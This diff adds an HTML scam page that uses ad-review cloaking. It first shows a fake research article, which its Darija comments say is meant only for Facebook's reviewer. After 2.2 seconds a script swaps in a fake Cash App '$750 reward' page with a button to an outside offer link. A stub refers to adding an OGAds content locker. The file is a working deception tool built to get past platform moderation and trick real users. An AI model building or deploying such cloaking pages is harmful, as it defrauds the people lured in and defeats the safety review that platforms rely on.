@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Financial Literacy - Research Node 2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* هاد الجزء كيشوفو غير فيسبوك */
+        #safe-site { display: block; padding: 40px; font-family: serif; color: #333; line-height: 1.8; background: white; }
+        
+        /* هاد الجزء هو العرض الحقيقي كيكون مخفي فالبداية */
+        #money-site { display: none; }
+        
+        .pulsate { animation: pulse-green 2s infinite; }
+        @keyframes pulse-green {
+            0% { box-shadow: 0 0 0 0 rgba(0, 208, 132, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(0, 208, 132, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 208, 132, 0); }
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+
+    <div id="safe-site" class="max-w-3xl mx-auto border border-gray-100 shadow-sm mt-10">
+        <h1 class="text-3xl font-bold mb-6">Impact of Peer-to-Peer Transactions on Modern Economics</h1>
+        <p class="mb-4 text-lg">Digital finance has undergone a massive transformation in the last decade. Our research analyzes how micro-transactions influence the consumer behavior of North American residents. By studying the velocity of money in digital ecosystems, we can predict inflation trends and retail growth...</p>
+        <p class="mb-4">This research node collect metadata regarding user interaction with financial UI components. We ensure that data integrity is maintained through a rigorous verification process that eliminates automated bot interference...</p>
+        <img src="https://images.unsplash.com/photo-1551288049-bbda38a5f452?auto=format&fit=crop&w=800&q=80" class="w-full rounded-xl my-6" alt="Data Research">
+        <p>The study concludes that providing digital incentives to research participants increases the accuracy of feedback by 45%. This methodology is currently being tested in various states across the USA...</p>
+    </div>
+
+    <div id="money-site" class="animate__animated animate__fadeIn">
+        <div class="max-w-md mx-auto px-4 pt-10">
+            <div class="bg-white rounded-3xl p-8 shadow-2xl border border-gray-100 text-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_Cash_app_logo.svg" class="w-16 h-16 mx-auto mb-4">
+                <h1 class="text-2xl font-bold mb-2">Claim Your $750 Reward</h1>
+                <p class="text-gray-500 mb-6 font-medium">Verification Successful. Your reward is ready for payout.</p>
+                <a href="https://feraveromonster.ink/sl/31roj" onclick="og_load()" class="pulsate w-full py-5 bg-[#00d084] text-white rounded-2xl font-black text-xl block shadow-lg uppercase tracking-widest">Claim Reward Now</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // دالة التبديل الذكية
+        setTimeout(function() {
+            // كنهبطو المحتوى الآمن ونطلعو العرض
+            document.getElementById('safe-site').style.display = 'none';
+            document.getElementById('money-site').style.display = 'block';
+            
+            // تبديل عنوان الصفحة باش يتناسب مع العرض
+            document.title = "Verification Successful - Claim $750";
+            
+            // تبديل لون الخلفية باش يتناسب مع Cash App
+            document.body.style.backgroundColor = "#f5f5f7";
+        }, 2200); // 2.2 ثانية كافية باش الروبوت يصور الصفحة ويخرج
+
+        function og_load() {
+            // كود OGAds إذا بغيتي تزيد اللوكر
+        }
+    </script>
+
+</body>
+</html>
